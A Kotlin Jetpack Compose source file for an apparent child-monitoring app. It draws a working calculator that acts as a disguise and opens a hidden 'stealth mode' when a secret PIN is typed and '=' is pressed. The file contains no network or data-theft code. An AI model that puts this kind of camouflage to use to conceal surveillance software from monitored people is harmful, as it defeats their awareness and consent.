package com.example.ui.screens

import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.aspectRatio
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.AirDroidChildApp

@Composable
fun CalculatorCamouflageScreen(
    onUnlockSuccess: () -> Unit
) {
    val context = LocalContext.current
    val stealthMgr = AirDroidChildApp.stealthManager

    var displayText by remember { mutableStateOf("0") }
    var operand1 by remember { mutableStateOf<Double?>(null) }
    var pendingOp by remember { mutableStateOf<String?>(null) }
    var isNewInput by remember { mutableStateOf(true) }
    var secretBuffer by remember { mutableStateOf("") }

    fun handleDigit(d: String) {
        secretBuffer += d
        if (isNewInput || displayText == "0") {
            displayText = d
            isNewInput = false
        } else {
            if (displayText.length < 12) {
                displayText += d
            }
        }
    }

    fun handleOperator(op: String) {
        secretBuffer = ""
        val currentVal = displayText.toDoubleOrNull() ?: 0.0
        operand1 = currentVal
        pendingOp = op
        isNewInput = true
    }

    fun calculateResult() {
        // First check if the typed secret matches stealth PIN
        if (stealthMgr != null && stealthMgr.verifyCamouflagePin(secretBuffer)) {
            Toast.makeText(context, "🔓 Stealth Mode Unlocked", Toast.LENGTH_SHORT).show()
            onUnlockSuccess()
            return
        }

        val currentVal = displayText.toDoubleOrNull() ?: 0.0
        val op1 = operand1
        val op = pendingOp

        if (op1 != null && op != null) {
            val res = when (op) {
                "+" -> op1 + currentVal
                "-" -> op1 - currentVal
                "×" -> op1 * currentVal
                "÷" -> if (currentVal != 0.0) op1 / currentVal else Double.NaN
                else -> currentVal
            }
            displayText = if (res.isNaN()) "Error" else {
                if (res % 1.0 == 0.0) res.toLong().toString() else "%.4f".format(res).trimEnd('0').trimEnd('.')
            }
            operand1 = null
            pendingOp = null
            isNewInput = true
            secretBuffer = ""
        }
    }

    fun clearAll() {
        displayText = "0"
        operand1 = null
        pendingOp = null
        isNewInput = true
        secretBuffer = ""
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF000000))
            .padding(16.dp)
            .testTag("calculator_camouflage_screen"),
        verticalArrangement = Arrangement.Bottom
    ) {
        // Output display
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
                .padding(horizontal = 12.dp, vertical = 24.dp),
            contentAlignment = Alignment.BottomEnd
        ) {
            Text(
                text = displayText,
                color = Color.White,
                fontSize = if (displayText.length > 8) 42.sp else 64.sp,
                fontWeight = FontWeight.Light,
                textAlign = TextAlign.End,
                maxLines = 1
            )
        }

        // Button Grid
        val buttons = listOf(
            listOf("C" to Color(0xFFA5A5A5), "+/-" to Color(0xFFA5A5A5), "%" to Color(0xFFA5A5A5), "÷" to Color(0xFFFF9F0A)),
            listOf("7" to Color(0xFF333333), "8" to Color(0xFF333333), "9" to Color(0xFF333333), "×" to Color(0xFFFF9F0A)),
            listOf("4" to Color(0xFF333333), "5" to Color(0xFF333333), "6" to Color(0xFF333333), "-" to Color(0xFFFF9F0A)),
            listOf("1" to Color(0xFF333333), "2" to Color(0xFF333333), "3" to Color(0xFF333333), "+" to Color(0xFFFF9F0A)),
            listOf("0" to Color(0xFF333333), "." to Color(0xFF333333), "=" to Color(0xFFFF9F0A))
        )

        buttons.forEach { row ->
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 5.dp),
                horizontalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                row.forEach { (label, bg) ->
                    val isZero = label == "0"
                    val isLightGray = bg == Color(0xFFA5A5A5)
                    val textColor = if (isLightGray) Color.Black else Color.White

                    Box(
                        modifier = Modifier
                            .weight(if (isZero) 2.1f else 1f)
                            .aspectRatio(if (isZero) 2.15f else 1f)
                            .clip(if (isZero) RoundedCornerShape(40.dp) else CircleShape)
                            .background(bg)
                            .clickable {
                                when (label) {
                                    "C" -> clearAll()
                                    "+/-" -> {
                                        val v = displayText.toDoubleOrNull() ?: 0.0
                                        displayText = if (v % 1.0 == 0.0) (-v.toLong()).toString() else (-v).toString()
                                    }
                                    "%" -> {
                                        val v = displayText.toDoubleOrNull() ?: 0.0
                                        displayText = (v / 100.0).toString()
                                    }
                                    "÷", "×", "-", "+" -> handleOperator(label)
                                    "=" -> calculateResult()
                                    "." -> {
                                        if (!displayText.contains(".")) {
                                            displayText += "."
                                            isNewInput = false
                                        }
                                    }
                                    else -> handleDigit(label)
                                }
                            },
                        contentAlignment = if (isZero) Alignment.CenterStart else Alignment.Center
                    ) {
                        Text(
                            text = label,
                            color = textColor,
                            fontSize = 30.sp,
                            fontWeight = FontWeight.Medium,
                            modifier = if (isZero) Modifier.padding(start = 28.dp) else Modifier
                        )
                    }
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
    }
}
